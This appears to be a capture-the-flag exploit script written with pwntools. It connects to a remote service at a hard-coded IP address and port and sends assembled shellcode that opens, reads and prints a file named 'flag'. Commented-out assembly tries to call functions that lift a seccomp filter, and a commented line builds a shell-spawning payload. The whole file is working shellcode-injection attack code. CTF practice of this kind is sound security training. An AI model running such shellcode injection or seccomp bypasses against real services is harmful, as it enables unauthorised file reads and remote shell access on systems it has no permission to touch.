import pwn 

conn = pwn.connect('3.71.110.92', 30300)

pwn.context.update(os='linux', arch='amd64')

# rm_seccomp = pwn.asm("""push rbp
# mov rbp, rsp
# sub rsp, 0x20
# mov rbx, qword [rsp + 0x20]
# add rbx, -(0x13c0 - 0x1090)
# mov rax, qword [rsp + 16 + 0x20]
# mov rdi, rax
# call rbx
# """)

# rm_seccomp = pwn.asm("""push rbp
# mov rbp, rsp
# sub rsp, 0x20
# mov rbx, qword [rsp + 0x20]
# add rbx, -(0x13c0 - 0x1040)
# mov ecx, 0x0
# mov edx, 59
# mov esi, 0x7fff0000
# mov rax, qword [rsp + 16 + 0x20]
# mov rdi, rax
# mov eax, 0x0
# call rbx

# mov rbx, qword [rsp + 0x20]
# add rbx, -(0x13c0 - 0x1070)
# mov rax, qword [rsp + 16 + 0x20]
# mov rdi, rax
# call rbx
# """)
# payload = pwn.asm(pwn.shellcraft.sh())

payload = pwn.asm(pwn.shellcraft.open('flag'))
payload += pwn.asm(pwn.shellcraft.read(fd=3, count=40))
payload += pwn.asm(pwn.shellcraft.write(fd=1, buf='rsp', n=40))

with open('payload', 'w') as f:
    import os
    os.write(f.fileno(), payload)

print(conn.recvuntil(b'...').decode())

conn.sendline(payload)

print(conn.recv())
print(conn.recv())


conn.close()